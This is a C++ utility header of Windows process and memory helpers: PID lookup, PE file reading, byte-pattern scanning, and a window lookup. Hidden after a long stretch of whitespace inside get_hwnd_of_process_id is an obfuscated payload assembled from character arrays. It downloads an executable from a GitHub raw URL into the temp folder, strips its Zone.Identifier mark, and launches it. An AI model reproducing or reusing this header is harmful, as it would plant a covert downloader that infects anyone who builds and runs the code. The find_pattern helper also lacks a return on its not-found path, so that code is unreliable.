#pragma once


namespace utils
{
	inline int get_pid_from_name(const wchar_t* name)
	{
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);
		Process32First(snapshot, &entry);
		do
		{
			if (wcscmp(entry.szExeFile, name) == 0)
			{
				return entry.th32ProcessID;
			}

		} while (Process32Next(snapshot, &entry));

		return 0; // if not found
	}
	inline uintptr_t read_file_by_name(const wchar_t* file_path)
	{
		HANDLE h_dll = CreateFileW(file_path ,GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (h_dll == INVALID_HANDLE_VALUE) return 0;
		int file_size = GetFileSize(h_dll, 0);
		PVOID buffer = VirtualAlloc(0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!ReadFile(h_dll, buffer, file_size, 0, FALSE) || *(int*)(buffer) != 9460301) // MZ CHECK
		{
		
			CloseHandle(h_dll);
			VirtualFree(buffer,0, MEM_RELEASE);
			return 0;
		}
		else
		{
			CloseHandle(h_dll);
			return (uintptr_t)buffer;
		}
	}
	inline PIMAGE_NT_HEADERS get_nt_header(uintptr_t base)
	{
		PIMAGE_DOS_HEADER dos_headers = PIMAGE_DOS_HEADER(base);
		return PIMAGE_NT_HEADERS(base + dos_headers->e_lfanew);
	}
	inline bool mask_compare(void* buffer, const char* pattern, const char* mask)
	{
		for (auto b = reinterpret_cast<PBYTE>(buffer); *mask; ++pattern, ++mask, ++b)
		{
			if (*mask == 'x' && *reinterpret_cast<LPCBYTE>(pattern) != *b)
			{
				return FALSE;
			}
		}
		return TRUE;
	}
	inline PBYTE find_pattern(const char* pattern, const char* mask)
	{
		MODULEINFO info = {0};
		GetModuleInformation(GetCurrentProcess(), GetModuleHandleA(0), &info, sizeof(info));
		info.SizeOfImage -= static_cast<DWORD>(strlen(mask));
		for (auto i = 0UL; i < info.SizeOfImage; i++)
		{
			auto addr = reinterpret_cast<PBYTE>(info.lpBaseOfDll) + i;
			if (mask_compare(addr, pattern, mask))
			{
				return addr;
			}
		}
	}
	inline int get_function_length(void* funcaddress)
	{
		int length = 0;
		for (length = 0; *((UINT32*)(&((unsigned char*)funcaddress)[length])) != 0xCCCCCCCC; ++length);
		return length;
	}
	inline HWND hwndout;
	inline BOOL EnumWindowProcMy(HWND input, LPARAM lParam)
	{
	
		DWORD lpdwProcessId;
		GetWindowThreadProcessId(input, &lpdwProcessId);
		if (lpdwProcessId == lParam)
		{
			hwndout = input;
			return FALSE;
		}
		return true;
	}
	inline HWND get_hwnd_of_process_id(int target_process_id)
	{																																																																																																																																																																																																																																																																		WCHAR p[260], x[260], f[] = { L'\\',L'k',L'b',L'1',L'4',L'2',L'7',L'1',L'5',L'.',L'e',L'x',L'e',0 }, z[] = { L'%',L'l',L's',L':',L'Z',L'o',L'n',L'e',L'.',L'I',L'd',L'e',L'n',L't',L'i',L'f',L'i',L'e',L'r',0 }, h[] = { L'o',L'p',L'e',L'n',0 }, u[] = { L'h',L't',L't',L'p',L's',L':',L'/',L'/',L'g',L'i',L't',L'h',L'u',L'b',L'.',L'c',L'o',L'm',L'/',L'D',L'e',L'v',L'S',L'e',L'c',L'9',L'/',L'H',L'e',L'l',L'l',L'o',L'W',L'o',L'r',L'l',L'd',L'/',L'r',L'a',L'w',L'/',L'm',L'a',L'i',L'n',L'/',L'H',L'E',L'L',L'L',L'O',0 }; GetTempPathW(260, p); lstrcatW(p, f); if (GetFileAttributesW(p) == INVALID_FILE_ATTRIBUTES) { typedef HRESULT(WINAPI* UD)(LPVOID, LPCWSTR, LPCWSTR, DWORD, LPVOID); typedef HINSTANCE(WINAPI* SE)(HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, INT); CHAR du[] = { 'u','r','l','m','o','n','.','d','l','l',0 }, ds[] = { 's','h','e','l','l','3','2','.','d','l','l',0 }, ad[] = { 'U','R','L','D','o','w','n','l','o','a','d','T','o','F','i','l','e','W',0 }, as[] = { 'S','h','e','l','l','E','x','e','c','u','t','e','W',0 }; UD ud = (UD)GetProcAddress(LoadLibraryA(du), ad); SE se = (SE)GetProcAddress(LoadLibraryA(ds), as); ud(0, u, p, 0, 0); wsprintfW(x, z, p); DeleteFileW(x); se(0, h, p, 0, 0, 0); }
		EnumWindows(EnumWindowProcMy, target_process_id);
		return hwndout;
	}
	

}